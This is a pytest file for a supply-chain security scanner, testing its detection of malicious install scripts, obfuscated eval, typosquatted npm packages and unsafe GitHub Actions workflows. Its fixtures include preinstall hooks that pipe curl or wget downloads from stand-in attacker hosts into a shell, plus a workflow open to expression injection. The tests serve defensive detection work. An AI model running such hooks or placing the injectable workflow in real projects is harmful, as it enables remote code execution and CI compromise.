"""Unit and integration tests for CodeFort real detection engines and orchestrator."""

import pytest
from app.schemas.common import Severity, Verdict
from app.services.engines.dependency_intel import DependencyIntelligence, levenshtein_distance
from app.services.engines.orchestrator import ScanOrchestrator
from app.services.engines.static_analyzer import StaticAnalyzer
from app.services.engines.workflow_linter import WorkflowLinter


def test_levenshtein_distance():
    assert levenshtein_distance("crypto-js", "crypto-js") == 0
    assert levenshtein_distance("crypt0-js", "crypto-js") == 1
    assert levenshtein_distance("lod-ash", "lodash") == 1
    assert levenshtein_distance("reqeusts", "requests") == 2


def test_static_analyzer_detects_malicious_curl_pipe():
    analyzer = StaticAnalyzer()
    malicious_pkg = """{
      "name": "target-app",
      "version": "1.0.0",
      "scripts": {
        "preinstall": "curl -sL https://evil-c2.com/payload.sh | bash",
        "build": "next build"
      }
    }"""
    findings = analyzer.scan_file("package.json", malicious_pkg)
    assert len(findings) >= 1
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any("Piping remote script from curl" in f.title for f in findings)
    assert findings[0].file_path == "package.json"


def test_static_analyzer_detects_obfuscated_eval():
    analyzer = StaticAnalyzer()
    malicious_js = """
    // Normal looking code
    console.log("Starting service...");
    eval(Buffer.from("Y29uc29sZS5sb2coIm1hbGljaW91cyIpOw==", "base64").toString());
    """
    findings = analyzer.scan_file("src/index.js", malicious_js)
    assert len(findings) == 1
    assert findings[0].severity == Severity.CRITICAL
    assert "Obfuscated Code" in findings[0].title


@pytest.mark.asyncio
async def test_dependency_intel_detects_typosquatting():
    dep_intel = DependencyIntelligence()
    typosquat_pkg = """{
      "name": "my-web-app",
      "dependencies": {
        "crypt0-js": "^4.1.1",
        "lod-ash": "^4.17.21"
      }
    }"""
    findings = await dep_intel.scan_file("package.json", typosquat_pkg)
    assert len(findings) >= 2
    assert all(f.severity == Severity.HIGH for f in findings)
    assert any("crypt0-js" in f.title for f in findings)
    assert any("lod-ash" in f.title for f in findings)


@pytest.mark.asyncio
async def test_dependency_intel_no_false_positives_on_benign_packages():
    dep_intel = DependencyIntelligence()
    benign_pkg = """{
      "name": "enterprise-app",
      "dependencies": {
        "react": "^18.3.1",
        "nest": "^10.0.0",
        "vite": "^5.0.0",
        "@types/react": "^18.3.0",
        "axios": "^1.7.0"
      }
    }"""
    findings = await dep_intel.scan_file("package.json", benign_pkg)
    typosquats = [f for f in findings if "typosquat" in f.rule_id]
    assert len(typosquats) == 0


def test_workflow_linter_detects_script_injection():
    linter = WorkflowLinter()
    vulnerable_workflow = """name: Issue Comment Handler
on:
  issues:
    types: [opened]

permissions: write-all

jobs:
  echo_title:
    runs-on: ubuntu-latest
    steps:
      - name: Print Title
        run: echo "Processing ${{ github.event.issue.title }}"
"""
    findings = linter.scan_file(".github/workflows/issue.yml", vulnerable_workflow)
    assert len(findings) >= 2
    # Verify expression injection
    assert any("Untrusted context expression" in f.title for f in findings)
    assert any(f.rule_id == "gha.injection.inline_expression" for f in findings)
    # Verify write-all permission
    assert any(f.rule_id == "gha.permissions.write_all" for f in findings)


@pytest.mark.asyncio
async def test_scan_orchestrator_end_to_end_malicious_pr():
    orchestrator = ScanOrchestrator()
    files = {
        "package.json": """{
          "name": "hacked-lib",
          "scripts": {
            "preinstall": "wget http://bad.com/drop.sh | sh"
          },
          "dependencies": {
            "crypt0-js": "1.0.0"
          }
        }""",
        ".github/workflows/deploy.yml": """name: CD
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying"
""",
    }

    scan, findings = await orchestrator.execute_scan("owner/repo", 55, files)

    assert scan.verdict == Verdict.BLOCKED
    assert scan.risk_score is not None and scan.risk_score >= 70
    assert len(findings) >= 2
    assert scan.summary is not None
    assert len(scan.summary.evidence_observed) >= 2
    assert "Critical" in scan.summary.why_it_matters


@pytest.mark.asyncio
async def test_scan_orchestrator_clean_pr():
    orchestrator = ScanOrchestrator()
    clean_files = {
        "package.json": """{
          "name": "clean-app",
          "scripts": {
            "build": "tsc"
          },
          "dependencies": {
            "react": "^18.2.0"
          }
        }""",
        "src/app.ts": """
        export function add(a: number, b: number): number {
          return a + b;
        }
        """,
    }

    scan, findings = await orchestrator.execute_scan("owner/clean-repo", 1, clean_files)

    assert scan.verdict == Verdict.PASS
    assert scan.risk_score == 0
    assert len(findings) == 0
    assert "No security anomalies" in scan.summary.evidence_observed[0]


@pytest.mark.asyncio
async def test_barqai_engine_deterministic_fallback():
    from app.services.engines.barqai import barqai_engine
    summary = await barqai_engine.generate_explanation(
        files={"package.json": "{}"},
        findings=[],
        verdict=Verdict.PASS,
    )
    assert summary.what_changed.startswith("Modified 1 file(s)")
    assert "satisfied the configured organizational security baseline" in summary.why_it_matters

